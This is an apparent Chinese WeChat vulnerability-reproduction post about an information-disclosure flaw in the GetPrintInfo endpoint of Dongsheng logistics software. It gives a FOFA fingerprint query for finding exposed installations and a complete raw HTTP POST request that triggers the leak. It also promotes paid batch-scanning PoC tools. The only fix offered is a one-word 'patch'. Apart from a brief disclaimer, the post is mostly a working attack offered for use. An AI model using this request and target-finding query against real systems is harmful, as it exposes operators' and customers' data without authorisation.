---
title: 东胜物流软件GetPrintInfo接口存在敏感信息泄露漏洞 附POC
url: https://mp.weixin.qq.com/s/cPMFl-eQdH4AnUvKjbCKSA
source: Doonsec's feed
date: 2026-01-20
fetch_date: 2026-01-21T03:30:38.312202
---

# 东胜物流软件GetPrintInfo接口存在敏感信息泄露漏洞 附POC

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3bpDZb8rGbYmTINrlqyTxwqIBRvCtYOFLia8OiceL9TPQpGgUiaOGhXicwpSibSRWFWJFctZyXiaSQldPYg/0?wx_fmt=jpeg)

# 东胜物流软件GetPrintInfo接口存在敏感信息泄露漏洞 附POC

2026-1-20更新
2026-1-20更新

南风漏洞复现文库

![]()

在小说阅读器中沉浸阅读

免责声明：请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。

## 1. 东胜物流软件简介

微信公众号搜索：南风漏洞复现文库
该文章 南风漏洞复现文库 公众号首发

东胜物流软件是青岛东胜伟业软件有限公司一款集订单管理、仓库管理、运输管理等多种功能于一体的物流管理软件。

## 2.漏洞描述

东胜物流软件是青岛东胜伟业软件有限公司一款集订单管理、仓库管理、运输管理等多种功能于一体的物流管理软件。 东胜物流软件GetPrintInfo接口存在敏感信息泄露漏洞。

CVE编号:

CNNVD编号:

CNVD编号:

## 3.影响版本

东胜物流软件
![东胜物流软件GetPrintInfo接口存在敏感信息泄露漏洞](https://mmbiz.qpic.cn/sz_mmbiz_png/HsJDm7fvc3bpDZb8rGbYmTINrlqyTxwqxZku1XZ2WcuWjuXrVYTHjsRicMhthjIq49EzqLBTY0Umxa7XLlZFYew/640?wx_fmt=png&from=appmsg "null")

东胜物流软件GetPrintInfo接口存在敏感信息泄露漏洞

## 4.fofa查询语句

body="FeeCodes/CompanysAdapter.aspx" || body="dhtmlxcombo\_whp.js" ||body="dongshengsoft" || body="theme/dhtmlxcombo.css"

## 5.漏洞复现

漏洞链接：http://xx.xx.xx.xx/CommMng/Print/GetPrintInfo

漏洞数据包：

```
POST /CommMng/Print/GetPrintInfo HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Host: xx.xx.xx.xx
Content-Length: 45
Content-Type: application/x-www-form-urlencoded

type=test&sql1=&sql2=&sql3=&sql4=&sql5=&sql6=
```

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3bpDZb8rGbYmTINrlqyTxwqic9IkX9XhAkMiaqrYibosR12OiajC9OOOdVDY3a7WbCibKHDgUJn52tQcMQ/640?wx_fmt=jpeg&from=appmsg "null")

## 6.POC&EXP

本期漏洞及往期漏洞的批量扫描POC及POC工具箱已经上传知识星球：南风网络安全

1: 更新poc批量扫描软件，承诺，一周更新8-14个插件吧，我会优先写使用量比较大程序漏洞。

2: 免登录，免费fofa查询。

3: 更新其他实用网络安全工具项目。

4: 免费指纹识别，持续更新指纹库。

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3bpDZb8rGbYmTINrlqyTxwqhQhIKBzHPMSgTMMvDDm6qUc0BqTxQia6JBkUic1I3FhKrPOeIdAwnVyw/640?wx_fmt=jpeg&from=appmsg "null")

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3bpDZb8rGbYmTINrlqyTxwqibmm84ic20hcRmMoHaOX1DeBUCyTPVpdSRicDrCDtYqapoXCN4Mgtd73g/640?wx_fmt=jpeg&from=appmsg "null")

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3bpDZb8rGbYmTINrlqyTxwq2xP5PW1HJNVLoeAEibia72PTLDiaUkqiaCp4Dzch3PXv9VfLTVCQ6dsPGw/640?wx_fmt=jpeg&from=appmsg "null")

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3bpDZb8rGbYmTINrlqyTxwqxqqYCPzWNwq529l2HpibflDx2cAicM2h2E4yHdTc2zeYhPVu8XgwZzQA/640?wx_fmt=jpeg&from=appmsg "null")

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3bpDZb8rGbYmTINrlqyTxwq9N6ONec675XgRYnW9w1R9eds45qkqbXMAM2WWuzsrKibCAdjodw6Njw/640?wx_fmt=jpeg&from=appmsg "null")

## 7.整改意见

打补丁

## 8.往期回顾

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/mmbiz_png/HsJDm7fvc3a95GFchUA48sGQuaFpFPPmL593YvcFo4IPeV2QPL2L72h5t4ibNq9IyXI9GmRWmvV2eh8zo3ldtmg/0?wx_fmt=png)

南风漏洞复现文库

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/HsJDm7fvc3a95GFchUA48sGQuaFpFPPmL593YvcFo4IPeV2QPL2L72h5t4ibNq9IyXI9GmRWmvV2eh8zo3ldtmg/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过